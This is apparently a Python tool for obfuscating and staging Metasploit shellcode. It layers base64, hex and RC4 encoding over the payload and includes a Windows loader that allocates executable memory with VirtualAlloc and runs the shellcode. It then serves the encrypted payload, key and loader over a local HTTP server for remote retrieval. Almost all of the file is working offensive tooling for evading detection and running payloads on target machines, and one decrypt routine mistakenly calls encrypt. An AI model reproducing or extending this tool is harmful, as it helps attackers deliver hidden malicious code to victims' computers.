# -*- coding: UTF-8 -*-
import string
import base64
import random
from os import system
from cryptography.fernet import Fernet
from sys import version_info


LOADER = """
ctypes.windll.kernel32.VirtualAlloc.restype = ctypes.c_uint64 
rwxpage = ctypes.windll.kernel32.VirtualAlloc(0, len(buf), 0x1000, 0x40)
ctypes.windll.kernel32.RtlMoveMemory(ctypes.c_uint64(rwxpage), ctypes.create_string_buffer(buf), len(buf))
runcode = ctypes.cast(rwxpage, ctypes.CFUNCTYPE(ctypes.c_void_p))
runcode()
"""


class Rc4:
    def __init__(self):
        pass
    
    def init_box(self, key):
        s_box = list(range(256))
        j = 0
        for i in range(256):
            j = (j + s_box[i] + ord(key[i % len(key)])) % 256
            s_box[i], s_box[j] = s_box[j], s_box[i]
        return s_box

    def encrypt(self, message, key):
        ciphertext = self.run(message, key)
        if version_info >= (3,0):
            base64_cipher = str(base64.b64encode(ciphertext.encode('utf-8')), 'utf-8')  # python3
        else:
            base64_cipher = base64.b64encode(ciphertext)
        return base64_cipher

    def decrypt(self, message, key):
        if version_info >= (3,0):
            ciphertext = str(base64.b64decode(message.encode('utf-8')), 'utf-8') # python3
        else:
            ciphertext = base64.b64decode(message)
        plaintext = self.run(ciphertext, key)
        return plaintext

    def run(self, message, key):
        box = self.init_box(key)
        res = []
        i = j = 0
        for s in message:
            i = (i + 1) % 256
            j = (j + box[i]) % 256
            box[i], box[j] = box[j], box[i]
            t = (box[i] + box[j]) % 256
            k = box[t]
            res.append(chr(ord(s) ^ k))
        cipher = "".join(res)
        return cipher


class Xor:
    def __init__(self):
        pass

    def decrypt(self, message, xor_key):
        random.seed(xor_key)
        ciphertext = ''
        code = message.split('.')
        for i in code:
            ciphertext = ciphertext + chr(int(i) ^ random.randint(0, 255))
        return ciphertext

    def encrypt(self, message, xor_key):
        random.seed(xor_key)
        ciphertext = ''
        for i in message:
            ciphertext = ciphertext + str(ord(i) ^ random.randint(0, 255)) + "."
        return ciphertext.rstrip('.')


class Encoder:
    def __init__(self):
        pass

    def _base16(self, message):
        return base64.b16encode(message)

    def _base64(self, message):
        return base64.b64encode(message)

    def _base32(self, message):
        return base64.b32encode(message)

    def _hex(self, message):
        if version_info >= (3,0):
            return message.hex()
        else:
            return message.encode('hex')


class Encrypt:
    def __init__(self):
        pass

    def rc4_encrypt(self, message, rc4_key):
        return Rc4().encrypt(message, rc4_key)

    def xor_encrypt(self, message, xor_key):
        return Xor().encrypt(message, xor_key)

    def fernet_encrypt(self, message, fernet_key):
        return Fernet(fernet_key).encrypt(message)


class Decoder:
    def __init__(self):
        pass

    def _base64(self, message):
        return base64.b64decode(message)

    def _base32(self, message):
        return base64.b32decode(message)

    def _base16(self, message):
        return base64.b16decode(message)

    def _hex(self, message):
        if version_info >= (3,0):
            return bytes.fromhex(message)
        else:
            return message.decode('hex')


class Decrypt:
    def __init__(self):
        pass

    def rc4_decrypt(self, message, rc4_key):
        return Rc4().decrypt(message, rc4_key)    

    def xor_decrypt(self, message, xor_key):
        return Xor().decrypt(message, xor_key)

    def fernet_decrypt(self, message, fernet_key):
        return Fernet(fernet_key).encrypt(message)


class GetKey:
    def __init__(self):
        pass

    def random_key(self, length):
        numOfNum = random.randint(1, length-1)
        numOfLetter = length - numOfNum
        slcNum = [random.choice(string.digits) for i in range(numOfNum)]
        slcLetter = [random.choice(string.ascii_letters) for i in range(numOfLetter)]
        slcChar = slcNum + slcLetter
        random.shuffle(slcChar)
        getPwd = ''.join([i for i in slcChar])
        return getPwd
    
    def fernet_key(self, length):
        return Fernet.generate_key()


if __name__ == "__main__":
    with open("./msf.shellcode") as shellcode:
        loc={}
        exec(shellcode.read(),globals(),loc)
        buf=loc["buf"]
        print(buf)

    # base64 + hex + rc4
    key = GetKey().random_key(10)
    buf = Encoder()._base64(buf)
    buf = Encoder()._hex(buf)
    buf = Encrypt().rc4_encrypt(buf, key)
    base64_loader = Encoder()._base64(LOADER.encode('utf-8')).decode("utf-8")
    print("key: " + key + "\n")
    print("shellcode: " + buf + "\n")
    print("loader: " + base64_loader + "\n")
    # read-in data
    with open('code.txt', mode='w') as f1:
        f1.write(buf)
    with open('key.txt', mode='w') as f2:
        f2.write(key)
    with open('loader.txt', mode='w') as f3:
        f3.write(base64_loader)
    if version_info >= (3,0):
        system("python3 -m http.server 780")
    else:
        system("python2 -m SimpleHTTPServer 780")
    
